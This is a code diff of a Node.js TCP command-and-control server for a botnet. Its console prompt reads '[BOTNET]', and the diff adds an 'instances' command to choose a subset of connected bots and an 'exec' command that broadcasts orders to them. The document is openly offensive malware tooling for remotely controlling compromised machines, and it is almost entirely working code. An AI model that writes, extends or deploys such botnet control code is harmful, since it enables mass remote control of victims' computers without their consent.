@@ -8,6 +8,7 @@ const readline = require("readline").createInterface({
 
 // Keep track of all clients
 const clients = [];
+let clientInstances = [...clients];
 let clientCount = 0;
 
 const PORT = process.env.PORT;
@@ -25,35 +26,44 @@ setTerminalTitle();
 
 net
   .createServer((socket) => {
-    // Identify this client
+    // Identify client
     socket.name = `${socket.remoteAddress}:${socket.remotePort}`;
 
-    // Put this new client in the list
+    // On client connect
     clients.push(socket);
 
     clientCount++;
+		clientInstances = [...clients];
     console.log(`Client ${socket.name} has connected.\n`);
 
     setTerminalTitle();
     prompt();
 
+    function prompt() {
+      readline.question("[BOTNET] ", (msg) => {
+        if (msg.startsWith("instances") && msg.split(" ")[1]) {
+					clientInstances = [...clients];
+					clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
+        }
+				if (msg.toLowerCase() === "instances") {
+					console.log(`Instances: ${clientInstances.length}`);
+				}
+        if (msg.toLowerCase().startsWith("exec")) broadcast(msg);
+        return prompt();
+      });
+    }
+
     function broadcast(message) {
-      clients.forEach((client) => {
+      clientInstances.forEach((client) => {
         client.write(message);
       });
       process.stdout.write("\n" + message);
     }
 
-    function prompt() {
-      readline.question("[BOTNET] ", (msg) => {
-        broadcast(msg);
-        return prompt();
-      });
-    }
-
     function clientDisconnected() {
       clients.splice(clients.indexOf(socket), 1);
       clientCount--;
+			clientInstances = [...clients];
       console.log(`Client ${socket.name} has disconnected.\n`);
       if (clientCount < 1) console.log("Waiting for clients to connect.\n");
       setTerminalTitle();
